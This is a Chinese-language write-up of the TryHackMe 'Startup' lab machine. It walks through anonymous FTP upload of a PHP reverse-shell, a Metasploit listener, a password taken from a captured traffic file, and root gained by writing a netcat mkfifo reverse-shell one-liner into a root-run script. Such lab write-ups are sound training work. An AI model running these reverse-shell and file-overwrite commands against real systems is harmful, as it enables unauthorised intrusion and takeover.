---
title: "THM Startup"
description: "TryHackMe篇之Startup"

date: 2024-10-01T19:35:50+08:00
lastmod: 2025-11-11T10:46:32+08:00

math: true
mermaid: true

categories:
  - TryHackMe
tags:
  - Linux
---
<!--more-->

> 靶机ip：10.10.45.30

# 信息收集

## nmap扫描

` nmap -sS -sV -sC 10.10.45.30`

```text
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-10-01 19:41 CST
mass_dns: warning: Unable to open /etc/resolv.conf. Try using --system-dns or specify valid servers with --dns-servers: No such file or directory (2)
mass_dns: warning: Unable to determine any DNS servers. Reverse DNS is disabled. Try using --system-dns or specify valid servers with --dns-servers
Nmap scan report for 10.10.45.30
Host is up (0.28s latency).
Not shown: 997 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
| drwxrwxrwx    2 65534    65534        4096 Nov 12  2020 ftp [NSE: writeable]
| -rw-r--r--    1 0        0          251631 Nov 12  2020 important.jpg
|_-rw-r--r--    1 0        0             208 Nov 12  2020 notice.txt
| ftp-syst:
|   STAT:
| FTP server status:
|      Connected to 10.11.101.220
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 2
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.10 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   2048 b9:a6:0b:84:1d:22:01:a4:01:30:48:43:61:2b:ab:94 (RSA)
|   256 ec:13:25:8c:18:20:36:e6:ce:91:0e:16:26:eb:a2:be (ECDSA)
|_  256 a2:ff:2a:72:81:aa:a2:9f:55:a4:dc:92:23:e6:b4:3f (ED25519)
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-title: Maintenance
|_http-server-header: Apache/2.4.18 (Ubuntu)
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 21.40 seconds
```

发现存在21，22，80端口，其中21端口可以匿名登录

## 21端口

直接匿名登录

`ftp anonymous@10.10.45.30`

![image-20241001194628456](https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/3051266-20241001194636259-1717138662.png)

![image-20241001194926284](https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/3051266-20241001194933862-1716586471.png)

发现存在一些文件全部`get`下来，其中`ftp`目录是空的

## ftp文件分析

* `important.jpg`

![image-20241001195233137](https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/3051266-20241001195241174-1196545580.png)

没啥用

* `notice.txt`

![image-20241001195322711](https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/3051266-20241001195329943-334597323.png)

看样子貌似跟下载文件有关？（并不确定）

## 80端口

![image-20241001195519953](https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/3051266-20241001195527538-1538863478.png)

首页什么也没有，直接扫目录

`gobuster dir -u http://10.10.45.30/ -w /usr/share/wordlists/dirb/common.txt -z`

![image-20241001200056829](https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/3051266-20241001200104194-693790804.png)

发现存在`/files`路由，访问一下

![image-20241001200137927](https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/3051266-20241001200145197-2050816862.png)

发现是我们通过`ftp`匿名登录获得的内容

# 获取主机权限

## MSF获取普通权限

发现在`ftp`中的文件可以在`http`中访问到，所以我们就可以通过`ftp`上传木马，通过`http`执行，从而获得服务器的权限

在之前我们从`ftp`下载文件的时候发现`ftp`目录是具有可写权限的，所以我们就通过这个目录上传文件

先生成一个php反弹shell的木马

![image-20241001201232855](https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/3051266-20241001201240718-6841116.png)

将该木马传到机器的ftp目录下，此时通过http可以查看到此文件

![image-20241001201317928](https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/3051266-20241001201325202-1889182470.png)

使用msf创建一个监听

```shell
use exploit/multi/handler	# 使用 exploit/multi/handler 模块
set  payload php/meterpreter/reverse_tcp	# 设置php的攻击负载payload
```

![image-20241001201526055](https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/3051266-20241001201533813-1700211541.png)

将参数设置好

`set LHOST  10.11.101.220`

![image-20241001201655307](https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/3051266-20241001201702538-1525155851.png)

`run`启动

在http上点击`shell.php`

![image-20241001201742671](https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/3051266-20241001201750120-518358356.png)

msf回连成功

利用`python -c 'import pty;pty.spawn("/bin/bash")'`拿到交互式shell

![image-20241001201856845](https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/3051266-20241001201904169-1947917994.png)

![image-20241001201949796](https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/image-20241001201949796.png)

在`/home`目录下发现`lennie`目录，但是我们没有权限访问

## Wireshark流量分析

![image-20241001202222169](https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/3051266-20241001202229662-246877002.png)

在根目录发现一些文件，查看一下

* `recipe.txt`

![image-20241001202328035](https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/3051266-20241001202335325-965983582.png)

还是没有什么可以利用的信息，继续查看别的内容

![image-20241001202444169](https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/3051266-20241001202451791-1921428504.png)

在一个我们可以访问的`incidents`文件夹中发现一个流量包，通过http将其下载到本地

![image-20241001202949932](https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/3051266-20241001202957544-1745101645.png)

将流量包转移至之前的ftp目录下，就可以通过http将文件下载到本地了

![image-20241001203548668](https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/3051266-20241001203556445-214800003.png)

拿`Wireshark`分析

![image-20241001204524749](https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/3051266-20241001204532595-900259921.png)

在流量包里发现疑似`lennie`用户的密码`c4ntg3t3n0ughsp1c3`，`ssh`尝试登陆一下

![image-20241001205510001](https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/3051266-20241001205517574-1258939451.png)

登陆成功

![image-20241001205650490](https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/3051266-20241001205657732-1629873569.png)

在`/home/lennie`目录下找到`user.txt`

# 权限提升

继续寻找其他信息，在`/home/lennie/Documents`下发现一些`txt`文件

![image-20241001210151013](https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/3051266-20241001210158295-521315857.png)

在`/home/lennie/scripts`下找到`sh`文件

![image-20241001210340532](https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/3051266-20241001210347977-2088833048.png)

查看一下

![image-20241001210314585](https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/3051266-20241001210321820-713500301.png)

继续查看一下`/etc/print.sh`文件

![image-20241001210430409](https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/3051266-20241001210437858-314517372.png)

我们又可以写入反弹的shell到`/etc/print.sh`文件中，然后通过`planner.sh`调用来获得root权限

`echo "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.11.101.220 4445 >/tmp/f" >/etc/print.sh`

执行将上述命令

![image-20241001210713124](https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/3051266-20241001210720380-89700049.png)

起一个新的监听

![image-20241001210747046](https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/3051266-20241001210754289-499424149.png)

几乎是瞬间就接受到了反弹的shell

![image-20241001210932745](https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/3051266-20241001210940417-178874238.png)

![image-20241001211016797](https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/3051266-20241001211024288-765111761.png)

直接在当前目录就找到了`root.txt`